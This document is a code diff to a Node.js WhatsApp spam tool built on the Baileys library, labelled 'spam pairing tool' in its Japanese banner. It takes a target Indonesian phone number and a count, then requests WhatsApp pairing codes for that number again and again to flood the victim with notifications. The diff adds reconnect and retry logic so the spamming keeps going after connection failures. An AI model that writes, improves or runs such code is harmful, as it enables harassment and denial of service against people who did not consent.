@@ -1,4 +1,4 @@
-const { default: makeWASocket, useMultiFileAuthState } = require("@whiskeysockets/baileys");
+const { default: makeWASocket, useMultiFileAuthState, DisconnectReason } = require("@whiskeysockets/baileys");
 const pino = require('pino');
 const readline = require("readline");
 
@@ -32,26 +32,78 @@ async function loadingSpinner(text, duration = 2000, interval = 100) {
     process.stdout.write('\r' + ' '.repeat(50) + '\r');
 }
 
-async function LuciferXSatanic() {
-    const { state } = await useMultiFileAuthState('./LUCIFER/session');
-    const LuciferBot = makeWASocket({
-        logger: pino({ level: "silent" }),
-        printQRInTerminal: false,
-        auth: state,
-        connectTimeoutMs: 60000,
-        defaultQueryTimeoutMs: 0,
-        keepAliveIntervalMs: 10000,
-        emitOwnEvents: true,
-        fireInitQueries: true,
-        generateHighQualityLinkPreview: true,
-        syncFullHistory: true,
-        markOnlineOnConnect: true,
-        browser: ["Ubuntu", "Chrome", "20.0.04"],
-    });
+async function connectWhatsApp() {
+    let retryCount = 0;
+    const maxRetries = 5;
+    const retryDelay = 5000; // 5 seconds
+    
+    while (retryCount < maxRetries) {
+        try {
+            const { state } = await useMultiFileAuthState('./LUCIFER/session');
+            const LuciferBot = makeWASocket({
+                logger: pino({ level: "silent" }),
+                printQRInTerminal: false,
+                auth: state,
+                connectTimeoutMs: 60000,
+                defaultQueryTimeoutMs: 0,
+                keepAliveIntervalMs: 10000,
+                emitOwnEvents: true,
+                fireInitQueries: true,
+                generateHighQualityLinkPreview: true,
+                syncFullHistory: true,
+                markOnlineOnConnect: true,
+                browser: ["Ubuntu", "Chrome", "20.0.04"],
+            });
 
-    while (true) {
-        console.clear();
-        console.log(wColor + `
+            // Handle connection events
+            LuciferBot.ev.on('connection.update', (update) => {
+                const { connection, lastDisconnect } = update;
+                if (connection === 'close') {
+                    const shouldReconnect = lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut;
+                    if (shouldReconnect) {
+                        console.log(wColor + '\nConnection lost, attempting to reconnect...' + xColor);
+                        connectWhatsApp().catch(err => console.error('Reconnection failed:', err));
+                    } else {
+                        console.log(wColor + '\nDevice logged out, please scan QR again.' + xColor);
+                        process.exit(0);
+                    }
+                } else if (connection === 'open') {
+                    console.log(wColor + '\nSuccessfully connected to WhatsApp!' + xColor);
+                    retryCount = 0; // Reset retry counter on successful connection
+                }
+            });
+
+            return LuciferBot;
+        } catch (error) {
+            retryCount++;
+            console.error(wColor + `Connection failed (attempt ${retryCount}/${maxRetries}):`, error.message + xColor);
+            if (retryCount < maxRetries) {
+                await delay(retryDelay);
+            }
+        }
+    }
+    throw new Error('Failed to connect after multiple attempts');
+}
+
+async function LuciferXSatanic() {
+    try {
+        let LuciferBot = await connectWhatsApp();
+
+        // Reconnect handler for the main loop
+        const handleReconnect = async () => {
+            console.log(wColor + '\nReconnecting...' + xColor);
+            try {
+                LuciferBot = await connectWhatsApp();
+                return true;
+            } catch (error) {
+                console.error('Reconnection failed:', error.message);
+                return false;
+            }
+        };
+
+        while (true) {
+            console.clear();
+            console.log(wColor + `
  • スパムペアリングツール
  • 作成者: Hazel
  • 使用注意
@@ -64,50 +116,60 @@ async function LuciferXSatanic() {
 ┗❐
 ` + xColor);
 
-        try {
-            let rawNumber = await question(wColor + 'ターゲット番号を入力してください : ' + xColor);
-            if (rawNumber.toLowerCase() === 'exit') {
-                console.log('Keluar...');
-                process.exit(0);
-            }
-            let phoneNumber = normalizePhoneNumber(rawNumber);
-            if (!phoneNumber.startsWith('62')) {
-                console.log('❌ インドネシア国番号 (62) を必ず使用してください');
-                await delay(2000);
-                continue;
-            }
-
-            let rawCount = await question(wColor + 'スパム回数を入力してください : ' + xColor);
-            if (rawCount.toLowerCase() === 'exit') {
-                console.log('Keluar...');
-                process.exit(0);
-            }
-            const LuciferCodes = parseInt(rawCount);
-            if (isNaN(LuciferCodes) || LuciferCodes <= 0) {
-                console.log('例 : 20');
-                await delay(2000);
-                continue;
-            }
-
-            for (let i = 0; i < LuciferCodes; i++) {
-                try {
-                    await loadingSpinner(`Sending package to ${phoneNumber}`, 2000, 200);
-                    let code = await LuciferBot.requestPairingCode(phoneNumber);
-                    code = code?.match(/.{1,4}/g)?.join("-") || code;
-                    console.log(wColor + `スパム成功 ✅ 番号 : ${phoneNumber} [${i + 1}/${LuciferCodes}]` + xColor);
-                } catch (error) {
-                    console.error('エラー:', error.message);
+            try {
+                let rawNumber = await question(wColor + 'ターゲット番号を入力してください : ' + xColor);
+                if (rawNumber.toLowerCase() === 'exit') {
+                    console.log('Keluar...');
+                    process.exit(0);
                 }
-                await delay(5000);
+                let phoneNumber = normalizePhoneNumber(rawNumber);
+                if (!phoneNumber.startsWith('62')) {
+                    console.log('❌ インドネシア国番号 (62) を必ず使用してください');
+                    await delay(2000);
+                    continue;
+                }
+
+                let rawCount = await question(wColor + 'スパム回数を入力してください : ' + xColor);
+                if (rawCount.toLowerCase() === 'exit') {
+                    console.log('Keluar...');
+                    process.exit(0);
+                }
+                const LuciferCodes = parseInt(rawCount);
+                if (isNaN(LuciferCodes) || LuciferCodes <= 0) {
+                    console.log('例 : 20');
+                    await delay(2000);
+                    continue;
+                }
+
+                for (let i = 0; i < LuciferCodes; i++) {
+                    try {
+                        await loadingSpinner(`Sending package to ${phoneNumber}`, 2000, 200);
+                        let code = await LuciferBot.requestPairingCode(phoneNumber);
+                        code = code?.match(/.{1,4}/g)?.join("-") || code;
+                        console.log(wColor + `スパム成功 ✅ 番号 : ${phoneNumber} [${i + 1}/${LuciferCodes}]` + xColor);
+                    } catch (error) {
+                        console.error('エラー:', error.message);
+                        // Attempt to reconnect if there's an error
+                        const reconnected = await handleReconnect();
+                        if (!reconnected) break;
+                    }
+                    await delay(5000);
+                }
+
+                console.log('\nSelesai! Menunggu input baru...');
+                await delay(3000);
+
+            } catch (error) {
+                console.error('エラーが発生しました', error.message);
+                // Attempt to reconnect if there's a major error
+                const reconnected = await handleReconnect();
+                if (!reconnected) break;
+                await delay(3000);
             }
-
-            console.log('\nSelesai! Menunggu input baru...');
-            await delay(3000);
-
-        } catch (error) {
-            console.error('エラーが発生しました', error.message);
-            await delay(3000);
         }
+    } catch (error) {
+        console.error('Fatal error:', error.message);
+        process.exit(1);
     }
 }
 
